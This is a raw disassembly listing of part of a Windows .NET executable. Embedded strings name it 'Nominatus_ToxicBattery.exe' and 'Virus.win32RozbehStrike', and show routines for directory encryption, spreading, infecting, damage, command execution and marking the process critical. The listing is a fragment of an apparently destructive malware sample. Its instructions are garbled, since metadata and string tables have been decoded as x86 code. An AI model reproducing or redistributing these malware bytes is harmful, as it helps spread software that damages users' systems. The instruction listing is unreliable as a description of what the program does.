  403143:	00 9e 00 19 00 31    	add    %bl,0x31001900(%esi)
  403149:	00 9e 00 19 00 39    	add    %bl,0x39001900(%esi)
  40314f:	00 9e 00 19 00 41    	add    %bl,0x41001900(%esi)
  403155:	00 9e 00 19 00 49    	add    %bl,0x49001900(%esi)
  40315b:	00 9e 00 19 00 51    	add    %bl,0x51001900(%esi)
  403161:	00 9e 00 19 00 59    	add    %bl,0x59001900(%esi)
  403167:	00 9e 00 19 00 61    	add    %bl,0x61001900(%esi)
  40316d:	00 9e 00 19 00 69    	add    %bl,0x69001900(%esi)
  403173:	00 9e 00 27 00 71    	add    %bl,0x71002700(%esi)
  403179:	00 9e 00 19 00 79    	add    %bl,0x79001900(%esi)
  40317f:	00 9e 00 32 00 89    	add    %bl,-0x76ffce00(%esi)
  403185:	00 9e 00 38 00 91    	add    %bl,-0x6effc800(%esi)
  40318b:	00 9e 00 15 00 99    	add    %bl,-0x66ffeb00(%esi)
  403191:	00 9e 00 19 00 a1    	add    %bl,-0x5effe700(%esi)
  403197:	00 d3                	add    %dl,%bl
  403199:	03 3d 00 a9 00 f5    	add    0xf500a900,%edi
  40319f:	03 41 00             	add    0x0(%ecx),%eax
  4031a2:	09 00                	or     %eax,(%eax)
  4031a4:	9e                   	sahf
  4031a5:	00 15 00 b1 00 27    	add    %dl,0x2700b100
  4031ab:	04 47                	add    $0x47,%al
  4031ad:	00 b9 00 33 04 4b    	add    %bh,0x4b043300(%ecx)
  4031b3:	00 c1                	add    %al,%cl
  4031b5:	00 45 04             	add    %al,0x4(%ebp)
  4031b8:	52                   	push   %edx
  4031b9:	00 b9 00 4c 04 59    	add    %bh,0x59044c00(%ecx)
  4031bf:	00 c9                	add    %cl,%cl
  4031c1:	00 1a                	add    %bl,(%edx)
  4031c3:	01 15 00 b1 00 61    	add    %edx,0x6100b100
  4031c9:	04 47                	add    $0x47,%al
  4031cb:	00 b9 00 6e 04 5f    	add    %bh,0x5f046e00(%ecx)
  4031d1:	00 b9 00 4c 04 65    	add    %bh,0x65044c00(%ecx)
  4031d7:	00 d9                	add    %bl,%cl
  4031d9:	00 a7 04 6d 00 d9    	add    %ah,-0x26ff92fc(%edi)
  4031df:	00 b5 04 3d 00 e9    	add    %dh,-0x16ffc2fc(%ebp)
  4031e5:	00 cc                	add    %cl,%ah
  4031e7:	04 73                	add    $0x73,%al
  4031e9:	00 e9                	add    %ch,%cl
  4031eb:	00 d5                	add    %dl,%ch
  4031ed:	04 73                	add    $0x73,%al
  4031ef:	00 d9                	add    %bl,%cl
  4031f1:	00 e4                	add    %ah,%ah
  4031f3:	04 79                	add    $0x79,%al
  4031f5:	00 f1                	add    %dh,%cl
  4031f7:	00 00                	add    %al,(%eax)
  4031f9:	05 7e 00 c1 00       	add    $0xc1007e,%eax
  4031fe:	45                   	inc    %ebp
  4031ff:	04 7e                	add    $0x7e,%al
  403201:	00 a9 00 08 05 84    	add    %ch,-0x7bfaf800(%ecx)
  403207:	00 f9                	add    %bh,%cl
  403209:	00 9e 00 15 00 f9    	add    %bl,-0x6ffeb00(%esi)
  40320f:	00 3e                	add    %bh,(%esi)
  403211:	05 8a 00 09 01       	add    $0x109008a,%eax
  403216:	7d 05                	jge    0x40321d
  403218:	90                   	nop
  403219:	00 f9                	add    %bh,%cl
  40321b:	00 81 05 90 00 11    	add    %al,0x11009005(%ecx)
  403221:	01 98 05 96 00 11    	add    %ebx,0x11009605(%eax)
  403227:	00 a2 05 9d 00 19    	add    %ah,0x19009d05(%edx)
  40322d:	01 b3 05 15 00 21    	add    %esi,0x21001505(%ebx)
  403233:	01 c0                	add    %eax,%eax
  403235:	05 a1 00 29 01       	add    $0x12900a1,%eax
  40323a:	db 05 a5 00 31 01    	fildl  0x13100a5
  403240:	e8 05 a8 00 39       	call   0x3940da4a
  403245:	01 01                	add    %eax,(%ecx)
  403247:	06                   	push   %es
  403248:	ae                   	scas   %es:(%edi),%al
  403249:	00 e9                	add    %ch,%cl
  40324b:	00 cc                	add    %cl,%ah
  40324d:	04 ef                	add    $0xef,%al
  40324f:	00 a9 00 16 06 f9    	add    %ch,-0x6f9ea00(%ecx)
  403255:	00 a9 00 24 06 84    	add    %ch,-0x7bf9dc00(%ecx)
  40325b:	00 21                	add    %ah,(%ecx)
  40325d:	01 9e 00 15 00 49    	add    %ebx,0x49001500(%esi)
  403263:	01 9e 00 15 00 49    	add    %ebx,0x49001500(%esi)
  403269:	01 3a                	add    %edi,(%edx)
  40326b:	06                   	push   %es
  40326c:	19 00                	sbb    %eax,(%eax)
  40326e:	49                   	dec    %ecx
  40326f:	01 47 06             	add    %eax,0x6(%edi)
  403272:	19 00                	sbb    %eax,(%eax)
  403274:	49                   	dec    %ecx
  403275:	01 68 06             	add    %ebp,0x6(%eax)
  403278:	17                   	pop    %ss
  403279:	01 21                	add    %esp,(%ecx)
  40327b:	01 78 06             	add    %edi,0x6(%eax)
  40327e:	1e                   	push   %ds
  40327f:	01 21                	add    %esp,(%ecx)
  403281:	01 86 06 25 01 09    	add    %eax,0x9012506(%esi)
  403287:	00 1a                	add    %bl,(%edx)
  403289:	01 27                	add    %esp,(%edi)
  40328b:	00 59 01             	add    %bl,0x1(%ecx)
  40328e:	ab                   	stos   %eax,%es:(%edi)
  40328f:	06                   	push   %es
  403290:	3a 01                	cmp    (%ecx),%al
  403292:	19 01                	sbb    %eax,(%ecx)
  403294:	bd 06 19 00 19       	mov    $0x19001906,%ebp
  403299:	01 c6                	add    %eax,%esi
  40329b:	06                   	push   %es
  40329c:	19 00                	sbb    %eax,(%eax)
  40329e:	69 01 9e 00 15 00    	imul   $0x15009e,(%ecx),%eax
  4032a4:	a1 00 e2 06 a1       	mov    0xa106e200,%eax
  4032a9:	00 a1 00 f5 06 46    	add    %ah,0x4606f500(%ecx)
  4032af:	01 a1 00 17 07 4b    	add    %esp,0x4b071700(%ecx)
  4032b5:	01 11                	add    %edx,(%ecx)
  4032b7:	00 9e 00 15 00 2e    	add    %bl,0x2e001500(%esi)
  4032bd:	00 33                	add    %dh,(%ebx)
  4032bf:	00 b7 01 2e 00 73    	add    %dh,0x73002e01(%edi)
  4032c5:	00 00                	add    %al,(%eax)
  4032c7:	02 2e                	add    (%esi),%ch
  4032c9:	00 13                	add    %dl,(%ebx)
  4032cb:	00 b7 01 2e 00 1b    	add    %dh,0x1b002e01(%edi)
  4032d1:	00 d4                	add    %dl,%ah
  4032d3:	01 2e                	add    %ebp,(%esi)
  4032d5:	00 23                	add    %ah,(%ebx)
  4032d7:	00 d4                	add    %dl,%ah
  4032d9:	01 2e                	add    %ebp,(%esi)
  4032db:	00 2b                	add    %ch,(%ebx)
  4032dd:	00 d4                	add    %dl,%ah
  4032df:	01 2e                	add    %ebp,(%esi)
  4032e1:	00 0b                	add    %cl,(%ebx)
  4032e3:	00 51 01             	add    %dl,0x1(%ecx)
  4032e6:	2e 00 3b             	add    %bh,%cs:(%ebx)
  4032e9:	00 da                	add    %bl,%dl
  4032eb:	01 2e                	add    %ebp,(%esi)
  4032ed:	00 43 00             	add    %al,0x0(%ebx)
  4032f0:	d4 01                	aam    $0x1
  4032f2:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  4032f6:	d4 01                	aam    $0x1
  4032f8:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  4032fc:	ee                   	out    %al,(%dx)
  4032fd:	01 2e                	add    %ebp,(%esi)
  4032ff:	00 6b 00             	add    %ch,0x0(%ebx)
  403302:	f7 01 80 01 e3 01    	testl  $0x1e30180,(%ecx)
  403308:	41                   	inc    %ecx
  403309:	01 b4 00 00 01 0d 01 	add    %esi,0x10d0100(%eax,%eax,1)
  403310:	29 01                	sub    %eax,(%ecx)
  403312:	32 01                	xor    (%ecx),%al
  403314:	36 01 bd 03 40 01 03 	add    %edi,%ss:0x3014003(%ebp)
  40331b:	00 86 00 01 00 04    	add    %al,0x4000100(%esi)
  403321:	80 00 00             	addb   $0x0,(%eax)
  403324:	01 00                	add    %eax,(%eax)
  403326:	00 00                	add    %al,(%eax)
  403328:	a1 1f dc 33 00       	mov    0x33dc1f,%eax
  40332d:	00 00                	add    %al,(%eax)
  40332f:	00 00                	add    %al,(%eax)
  403331:	00 93 03 00 00 04    	add    %dl,0x4000003(%ebx)
	...
  40333f:	00 00                	add    %al,(%eax)
  403341:	00 01                	add    %al,(%ecx)
  403343:	00 4e 00             	add    %cl,0x0(%esi)
  403346:	00 00                	add    %al,(%eax)
  403348:	00 00                	add    %al,(%eax)
  40334a:	04 00                	add    $0x0,%al
	...
  403354:	00 00                	add    %al,(%eax)
  403356:	01 00                	add    %eax,(%eax)
  403358:	68 00 00 00 00       	push   $0x0
  40335d:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  403368:	00 00                	add    %al,(%eax)
  40336a:	01 00                	add    %eax,(%eax)
  40336c:	71 00                	jno    0x40336e
  40336e:	00 00                	add    %al,(%eax)
  403370:	00 00                	add    %al,(%eax)
  403372:	00 00                	add    %al,(%eax)
  403374:	00 3c 4d 6f 64 75 6c 	add    %bh,0x6c75646f(,%ecx,2)
  40337b:	65 3e 00 4e 6f       	gs add %cl,%ds:0x6f(%esi)
  403380:	6d                   	insl   (%dx),%es:(%edi)
  403381:	69 6e 61 74 75 73 5f 	imul   $0x5f737574,0x61(%esi),%ebp
  403388:	54                   	push   %esp
  403389:	6f                   	outsl  %ds:(%esi),(%dx)
  40338a:	78 69                	js     0x4033f5
  40338c:	63 42 61             	arpl   %eax,0x61(%edx)
  40338f:	74 74                	je     0x403405
  403391:	65 72 79             	gs jb  0x40340d
  403394:	2e 65 78 65          	cs js,pn 0x4033fd
  403398:	00 4d 61             	add    %cl,0x61(%ebp)
  40339b:	69 6e 46 6f 72 6d 00 	imul   $0x6d726f,0x46(%esi),%ebp
  4033a2:	56                   	push   %esi
  4033a3:	69 72 75 73 2e 77 69 	imul   $0x69772e73,0x75(%edx),%esi
  4033aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4033ab:	33 32                	xor    (%edx),%esi
  4033ad:	52                   	push   %edx
  4033ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4033af:	7a 62                	jp     0x403413
  4033b1:	65 68 53 74 72 69    	gs push $0x69727453
  4033b7:	6b 65 00 50          	imul   $0x50,0x0(%ebp),%esp
  4033bb:	72 6f                	jb     0x40342c
  4033bd:	67 72 61             	addr16 jb 0x403421
  4033c0:	6d                   	insl   (%dx),%es:(%edi)
  4033c1:	00 53 79             	add    %dl,0x79(%ebx)
  4033c4:	73 74                	jae    0x40343a
  4033c6:	65 6d                	gs insl (%dx),%es:(%edi)
  4033c8:	2e 57                	cs push %edi
  4033ca:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  4033d1:	46                   	inc    %esi
  4033d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4033d3:	72 6d                	jb     0x403442
  4033d5:	73 00                	jae    0x4033d7
  4033d7:	46                   	inc    %esi
  4033d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4033d9:	72 6d                	jb     0x403448
  4033db:	00 6d 73             	add    %ch,0x73(%ebp)
  4033de:	63 6f 72             	arpl   %ebp,0x72(%edi)
  4033e1:	6c                   	insb   (%dx),%es:(%edi)
  4033e2:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  4033e9:	65 6d                	gs insl (%dx),%es:(%edi)
  4033eb:	00 4f 62             	add    %cl,0x62(%edi)
  4033ee:	6a 65                	push   $0x65
  4033f0:	63 74 00 6d          	arpl   %esi,0x6d(%eax,%eax,1)
  4033f4:	79 73                	jns    0x403469
  4033f6:	65 6c                	gs insb (%dx),%es:(%edi)
  4033f8:	66 00 52 74          	data16 add %dl,0x74(%edx)
  4033fc:	6c                   	insb   (%dx),%es:(%edi)
  4033fd:	53                   	push   %ebx
  4033fe:	65 74 50             	gs je  0x403451
  403401:	72 6f                	jb     0x403472
  403403:	63 65 73             	arpl   %esp,0x73(%ebp)
  403406:	73 49                	jae    0x403451
  403408:	73 43                	jae    0x40344d
  40340a:	72 69                	jb     0x403475
  40340c:	74 69                	je     0x403477
  40340e:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  403411:	00 2e                	add    %ch,(%esi)
  403413:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  403417:	00 65 6e             	add    %ah,0x6e(%ebp)
  40341a:	63 72 79             	arpl   %esi,0x79(%edx)
  40341d:	70 74                	jo     0x403493
  40341f:	44                   	inc    %esp
  403420:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  403427:	79 00                	jns    0x403429
  403429:	46                   	inc    %esi
  40342a:	69 6e 61 6c 50 6f 77 	imul   $0x776f506c,0x61(%esi),%ebp
  403431:	65 72 00             	gs jb  0x403434
  403434:	53                   	push   %ebx
  403435:	70 72                	jo     0x4034a9
  403437:	65 61                	gs popa
  403439:	64 49                	fs dec %ecx
  40343b:	54                   	push   %esp
  40343c:	00 72 75             	add    %dh,0x75(%edx)
  40343f:	6e                   	outsb  %ds:(%esi),(%dx)
  403440:	43                   	inc    %ebx
  403441:	6f                   	outsl  %ds:(%esi),(%dx)
  403442:	6d                   	insl   (%dx),%es:(%edi)
  403443:	6d                   	insl   (%dx),%es:(%edi)
  403444:	61                   	popa
  403445:	6e                   	outsb  %ds:(%esi),(%dx)
  403446:	64 00 48 41          	add    %cl,%fs:0x41(%eax)
  40344a:	48                   	dec    %eax
  40344b:	41                   	inc    %ecx
  40344c:	48                   	dec    %eax
  40344d:	00 44 61 6d          	add    %al,0x6d(%ecx,%eiz,2)
  403451:	61                   	popa
  403452:	67 65 00 66 61       	add    %ah,%gs:0x61(%bp)
  403457:	73 74                	jae    0x4034cd
  403459:	49                   	dec    %ecx
  40345a:	6e                   	outsb  %ds:(%esi),(%dx)
  40345b:	66 65 63 74 6f 72    	arpl   %si,%gs:0x72(%edi,%ebp,2)
  403461:	00 53 79             	add    %dl,0x79(%ebx)
  403464:	73 74                	jae    0x4034da
  403466:	65 6d                	gs insl (%dx),%es:(%edi)
  403468:	2e 43                	cs inc %ebx
  40346a:	6f                   	outsl  %ds:(%esi),(%dx)
  40346b:	6d                   	insl   (%dx),%es:(%edi)
  40346c:	70 6f                	jo     0x4034dd
  40346e:	6e                   	outsb  %ds:(%esi),(%dx)
  40346f:	65 6e                	outsb  %gs:(%esi),(%dx)
  403471:	74 4d                	je     0x4034c0
  403473:	6f                   	outsl  %ds:(%esi),(%dx)
  403474:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  403477:	00 49 43             	add    %cl,0x43(%ecx)
  40347a:	6f                   	outsl  %ds:(%esi),(%dx)
  40347b:	6e                   	outsb  %ds:(%esi),(%dx)
  40347c:	74 61                	je     0x4034df
  40347e:	69 6e 65 72 00 63 6f 	imul   $0x6f630072,0x65(%esi),%ebp
  403485:	6d                   	insl   (%dx),%es:(%edi)
  403486:	70 6f                	jo     0x4034f7
  403488:	6e                   	outsb  %ds:(%esi),(%dx)
  403489:	65 6e                	outsb  %gs:(%esi),(%dx)
  40348b:	74 73                	je     0x403500
  40348d:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  403491:	70 6f                	jo     0x403502
  403493:	73 65                	jae    0x4034fa
  403495:	00 49 6e             	add    %cl,0x6e(%ecx)
  403498:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  40349f:	65 
  4034a0:	43                   	inc    %ebx
  4034a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4034a2:	6d                   	insl   (%dx),%es:(%edi)
  4034a3:	70 6f                	jo     0x403514
  4034a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4034a6:	65 6e                	outsb  %gs:(%esi),(%dx)
  4034a8:	74 00                	je     0x4034aa
  4034aa:	4d                   	dec    %ebp
  4034ab:	61                   	popa
  4034ac:	69 6e 00 76 31 00 76 	imul   $0x76003176,0x0(%esi),%ebp
  4034b3:	32 00                	xor    (%eax),%al
  4034b5:	76 33                	jbe    0x4034ea
  4034b7:	00 46 69             	add    %al,0x69(%esi)
  4034ba:	6c                   	insb   (%dx),%es:(%edi)
  4034bb:	65 50                	gs push %eax
  4034bd:	61                   	popa
  4034be:	74 68                	je     0x403528
  4034c0:	4e                   	dec    %esi
  4034c1:	61                   	popa
  4034c2:	6d                   	insl   (%dx),%es:(%edi)
  4034c3:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  4034c7:	6c                   	insb   (%dx),%es:(%edi)
  4034c8:	65 50                	gs push %eax
  4034ca:	61                   	popa
  4034cb:	74 68                	je     0x403535
  4034cd:	00 44 49 53          	add    %al,0x53(%ecx,%ecx,2)
  4034d1:	4b                   	dec    %ebx
  4034d2:	00 63 6f             	add    %ah,0x6f(%ebx)
  4034d5:	6d                   	insl   (%dx),%es:(%edi)
  4034d6:	6d                   	insl   (%dx),%es:(%edi)
  4034d7:	61                   	popa
  4034d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4034d9:	64 73 00             	fs jae 0x4034dc
  4034dc:	46                   	inc    %esi
  4034dd:	69 6c 65 4e 61 4d 45 	imul   $0x454d61,0x4e(%ebp,%eiz,2),%ebp
  4034e4:	00 
  4034e5:	44                   	inc    %esp
  4034e6:	72 69                	jb     0x403551
  4034e8:	76 65                	jbe    0x40354f
  4034ea:	4e                   	dec    %esi
  4034eb:	61                   	popa
  4034ec:	6d                   	insl   (%dx),%es:(%edi)
  4034ed:	65 54                	gs push %esp
  4034ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4034f0:	46                   	inc    %esi
  4034f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4034f2:	72 6d                	jb     0x403561
  4034f4:	61                   	popa
  4034f5:	74 00                	je     0x4034f7
  4034f7:	46                   	inc    %esi
  4034f8:	49                   	dec    %ecx
  4034f9:	4c                   	dec    %esp
  4034fa:	4e                   	dec    %esi
  4034fb:	41                   	inc    %ecx
  4034fc:	4d                   	dec    %ebp
  4034fd:	45                   	inc    %ebp
  4034fe:	00 64 69 73          	add    %ah,0x73(%ecx,%ebp,2)
  403502:	70 6f                	jo     0x403573
  403504:	73 69                	jae    0x40356f
  403506:	6e                   	outsb  %ds:(%esi),(%dx)
  403507:	67 00 61 72          	add    %ah,0x72(%bx,%di)
  40350b:	67 73 00             	addr16 jae 0x40350e
  40350e:	53                   	push   %ebx
  40350f:	79 73                	jns    0x403584
  403511:	74 65                	je     0x403578
  403513:	6d                   	insl   (%dx),%es:(%edi)
  403514:	2e 52                	cs push %edx
  403516:	75 6e                	jne    0x403586
  403518:	74 69                	je     0x403583
  40351a:	6d                   	insl   (%dx),%es:(%edi)
  40351b:	65 2e 56             	gs cs push %esi
  40351e:	65 72 73             	gs jb  0x403594
  403521:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  403528:	54                   	push   %esp
  403529:	61                   	popa
  40352a:	72 67                	jb     0x403593
  40352c:	65 74 46             	gs je  0x403575
  40352f:	72 61                	jb     0x403592
  403531:	6d                   	insl   (%dx),%es:(%edi)
  403532:	65 77 6f             	gs ja  0x4035a4
  403535:	72 6b                	jb     0x4035a2
  403537:	41                   	inc    %ecx
  403538:	74 74                	je     0x4035ae
  40353a:	72 69                	jb     0x4035a5
  40353c:	62 75 74             	bound  %esi,0x74(%ebp)
  40353f:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  403543:	73 74                	jae    0x4035b9
  403545:	65 6d                	gs insl (%dx),%es:(%edi)
  403547:	2e 52                	cs push %edx
  403549:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  40354c:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  403551:	6e                   	outsb  %ds:(%esi),(%dx)
  403552:	00 41 73             	add    %al,0x73(%ecx)
  403555:	73 65                	jae    0x4035bc
  403557:	6d                   	insl   (%dx),%es:(%edi)
  403558:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40355c:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  403563:	72 
  403564:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  40356b:	73 73                	jae    0x4035e0
  40356d:	65 6d                	gs insl (%dx),%es:(%edi)
  40356f:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  403573:	65 73 63             	gs jae 0x4035d9
  403576:	72 69                	jb     0x4035e1
  403578:	70 74                	jo     0x4035ee
  40357a:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  403581:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  403588:	73 73                	jae    0x4035fd
  40358a:	65 6d                	gs insl (%dx),%es:(%edi)
  40358c:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  403590:	6f                   	outsl  %ds:(%esi),(%dx)
  403591:	6e                   	outsb  %ds:(%esi),(%dx)
  403592:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  403598:	74 69                	je     0x403603
  40359a:	6f                   	outsl  %ds:(%esi),(%dx)
  40359b:	6e                   	outsb  %ds:(%esi),(%dx)
  40359c:	41                   	inc    %ecx
  40359d:	74 74                	je     0x403613
  40359f:	72 69                	jb     0x40360a
  4035a1:	62 75 74             	bound  %esi,0x74(%ebp)
  4035a4:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4035a8:	73 65                	jae    0x40360f
  4035aa:	6d                   	insl   (%dx),%es:(%edi)
  4035ab:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4035af:	6f                   	outsl  %ds:(%esi),(%dx)
  4035b0:	6d                   	insl   (%dx),%es:(%edi)
  4035b1:	70 61                	jo     0x403614
  4035b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4035b4:	79 41                	jns    0x4035f7
  4035b6:	74 74                	je     0x40362c
  4035b8:	72 69                	jb     0x403623
  4035ba:	62 75 74             	bound  %esi,0x74(%ebp)
  4035bd:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4035c1:	73 65                	jae    0x403628
  4035c3:	6d                   	insl   (%dx),%es:(%edi)
  4035c4:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  4035c8:	72 6f                	jb     0x403639
  4035ca:	64 75 63             	fs jne 0x403630
  4035cd:	74 41                	je     0x403610
  4035cf:	74 74                	je     0x403645
  4035d1:	72 69                	jb     0x40363c
  4035d3:	62 75 74             	bound  %esi,0x74(%ebp)
  4035d6:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4035da:	73 65                	jae    0x403641
  4035dc:	6d                   	insl   (%dx),%es:(%edi)
  4035dd:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4035e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4035e2:	70 79                	jo     0x40365d
  4035e4:	72 69                	jb     0x40364f
  4035e6:	67 68 74 41 74 74    	addr16 push $0x74744174
  4035ec:	72 69                	jb     0x403657
  4035ee:	62 75 74             	bound  %esi,0x74(%ebp)
  4035f1:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4035f5:	73 65                	jae    0x40365c
  4035f7:	6d                   	insl   (%dx),%es:(%edi)
  4035f8:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4035fc:	72 61                	jb     0x40365f
  4035fe:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  403601:	61                   	popa
  403602:	72 6b                	jb     0x40366f
  403604:	41                   	inc    %ecx
  403605:	74 74                	je     0x40367b
  403607:	72 69                	jb     0x403672
  403609:	62 75 74             	bound  %esi,0x74(%ebp)
  40360c:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  403610:	73 65                	jae    0x403677
  403612:	6d                   	insl   (%dx),%es:(%edi)
  403613:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  403617:	75 6c                	jne    0x403685
  403619:	74 75                	je     0x403690
  40361b:	72 65                	jb     0x403682
  40361d:	41                   	inc    %ecx
  40361e:	74 74                	je     0x403694
  403620:	72 69                	jb     0x40368b
  403622:	62 75 74             	bound  %esi,0x74(%ebp)
  403625:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  403629:	73 74                	jae    0x40369f
  40362b:	65 6d                	gs insl (%dx),%es:(%edi)
  40362d:	2e 52                	cs push %edx
  40362f:	75 6e                	jne    0x40369f
  403631:	74 69                	je     0x40369c
  403633:	6d                   	insl   (%dx),%es:(%edi)
  403634:	65 2e 49             	gs cs dec %ecx
  403637:	6e                   	outsb  %ds:(%esi),(%dx)
  403638:	74 65                	je     0x40369f
  40363a:	72 6f                	jb     0x4036ab
  40363c:	70 53                	jo     0x403691
  40363e:	65 72 76             	gs jb  0x4036b7
  403641:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
  403648:	6d                   	insl   (%dx),%es:(%edi)
  403649:	56                   	push   %esi
  40364a:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  403651:	74 74                	je     0x4036c7
  403653:	72 69                	jb     0x4036be
  403655:	62 75 74             	bound  %esi,0x74(%ebp)
  403658:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40365c:	73 65                	jae    0x4036c3
  40365e:	6d                   	insl   (%dx),%es:(%edi)
  40365f:	62 6c 79 56          	bound  %ebp,0x56(%ecx,%edi,2)
  403663:	65 72 73             	gs jb  0x4036d9
  403666:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  40366d:	69 62 75 74 65 00 53 	imul   $0x53006574,0x75(%edx),%esp
  403674:	79 73                	jns    0x4036e9
  403676:	74 65                	je     0x4036dd
  403678:	6d                   	insl   (%dx),%es:(%edi)
  403679:	2e 44                	cs inc %esp
  40367b:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  403682:	69 63 73 00 44 65 62 	imul   $0x62654400,0x73(%ebx),%esp
  403689:	75 67                	jne    0x4036f2
  40368b:	67 61                	addr16 popa
  40368d:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  403691:	74 74                	je     0x403707
  403693:	72 69                	jb     0x4036fe
  403695:	62 75 74             	bound  %esi,0x74(%ebp)
  403698:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40369d:	75 67                	jne    0x403706
  40369f:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  4036a6:	65 
  4036a7:	73 00                	jae    0x4036a9
  4036a9:	53                   	push   %ebx
  4036aa:	79 73                	jns    0x40371f
  4036ac:	74 65                	je     0x403713
  4036ae:	6d                   	insl   (%dx),%es:(%edi)
  4036af:	2e 52                	cs push %edx
  4036b1:	75 6e                	jne    0x403721
  4036b3:	74 69                	je     0x40371e
  4036b5:	6d                   	insl   (%dx),%es:(%edi)
  4036b6:	65 2e 43             	gs cs inc %ebx
  4036b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4036ba:	6d                   	insl   (%dx),%es:(%edi)
  4036bb:	70 69                	jo     0x403726
  4036bd:	6c                   	insb   (%dx),%es:(%edi)
  4036be:	65 72 53             	gs jb  0x403714
  4036c1:	65 72 76             	gs jb  0x40373a
  4036c4:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
  4036cb:	6d                   	insl   (%dx),%es:(%edi)
  4036cc:	70 69                	jo     0x403737
  4036ce:	6c                   	insb   (%dx),%es:(%edi)
  4036cf:	61                   	popa
  4036d0:	74 69                	je     0x40373b
  4036d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4036d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4036d4:	52                   	push   %edx
  4036d5:	65 6c                	gs insb (%dx),%es:(%edi)
  4036d7:	61                   	popa
  4036d8:	78 61                	js     0x40373b
  4036da:	74 69                	je     0x403745
  4036dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4036dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4036de:	73 41                	jae    0x403721
  4036e0:	74 74                	je     0x403756
  4036e2:	72 69                	jb     0x40374d
  4036e4:	62 75 74             	bound  %esi,0x74(%ebp)
  4036e7:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4036eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4036ec:	74 69                	je     0x403757
  4036ee:	6d                   	insl   (%dx),%es:(%edi)
  4036ef:	65 43                	gs inc %ebx
  4036f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4036f2:	6d                   	insl   (%dx),%es:(%edi)
  4036f3:	70 61                	jo     0x403756
  4036f5:	74 69                	je     0x403760
  4036f7:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  4036fa:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  403701:	69 
  403702:	62 75 74             	bound  %esi,0x74(%ebp)
  403705:	65 00 4e 6f          	add    %cl,%gs:0x6f(%esi)
  403709:	6d                   	insl   (%dx),%es:(%edi)
  40370a:	69 6e 61 74 75 73 5f 	imul   $0x5f737574,0x61(%esi),%ebp
  403711:	54                   	push   %esp
  403712:	6f                   	outsl  %ds:(%esi),(%dx)
  403713:	78 69                	js     0x40377e
  403715:	63 42 61             	arpl   %eax,0x61(%edx)
  403718:	74 74                	je     0x40378e
  40371a:	65 72 79             	gs jb  0x403796
  40371d:	00 44 6c 6c          	add    %al,0x6c(%esp,%ebp,2)
  403721:	49                   	dec    %ecx
  403722:	6d                   	insl   (%dx),%es:(%edi)
  403723:	70 6f                	jo     0x403794
  403725:	72 74                	jb     0x40379b
  403727:	41                   	inc    %ecx
